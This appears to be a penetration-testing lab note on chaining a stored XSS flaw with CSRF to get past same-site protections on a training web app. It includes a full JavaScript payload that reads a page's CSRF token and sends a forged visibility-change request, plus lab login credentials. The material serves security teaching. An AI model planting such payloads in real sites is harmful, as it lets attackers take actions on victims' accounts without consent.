---
title: h-Chain XSS CSRF
draft: false
tags:
  - xss
  - csrf
---
Sometimes, even if we manage to bypass CSRF protections, we may not be able to create cross-site requests due to some sort of same origin/same site restriction. If this is the case, we can try chaining vulnerabilities to get the end result of CSRF.

## Exploit

> Log-in to the vulnerable web app.

Some facts about the application:

- The application features same origin/same site protections as anti-CSRF measures (through a server configuration - you won't be able to actually spot it)
- The application's _Country_ field is vulnerable to stored XSS attacks (like we saw in the _Cross-Site Scripting (XSS)_ section)

Malicious cross-site requests are out of the equation due to the same origin/same site protections. We can still perform a CSRF attack through the stored XSS vulnerability that exists. Specifically, we will leverage the stored XSS vulnerability to issue a state-changing request against the web application. A request through XSS will bypass any same origin/same site protection since it will derive from the same domain!

Now it is time to develop the appropriate JavaScript payload to place within the _Country_ field of Ela Stienen's profile.

Let us target the _Change Visibility_ request because a successful CSRF attack targeting _Change Visibility_ can cause the disclosure of a private profile.

By browsing the application, we notice that Ela Stienen can't share her profile. This is because her profile is _private_. Let us change that by clicking "Change Visibility."

Then, activate Burp Suite's proxy (_Intercept On_) and configure your browser to go through it. Now click _Make Public!_.

```
POST /app/change-visibility HTTP/1.1

csrf=lkewldkfn0930esdonsdo3&action=change
```

Forward all requests so that Ela Stienen's profile becomes public.

Now we know how changing visibility works in this web app

### Attack

Let us focus on the payload we should specify in the _Country_ field of Ela Stienen's profile to successfully execute a CSRF attack that will change the victim's visibility settings (From private to public and vice versa).

The payload we should specify can be seen below.

```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/app/change-visibility',true);
req.send();
function handleResponse(d) {
    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/change-visibility', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token+'&action=change');
};
</script>
```

First, submit the full payload to the _Country_ field of Ela Stienen's profile and click "Save".

Open a `New Private Window`, navigate to `http://minilab.htb.net` again and log in to the application using the credentials below:

- Email: goldenpeacock467
- Password: topcat

This is a user that has its profile "private." No "Share" functionality exists.

Open a new tab and browse Ela Stienen's public profile by navigating to the link below.

`http://minilab.htb.net/profile?email=ela.stienen@example.com`

Now, if you go back to the victim's usual profile page and refresh/reload the page, you should see that his profile became "public" (notice the "Share" button that appeared).

You just executed a CSRF attack through XSS, bypassing the same origin/same site protections in place!

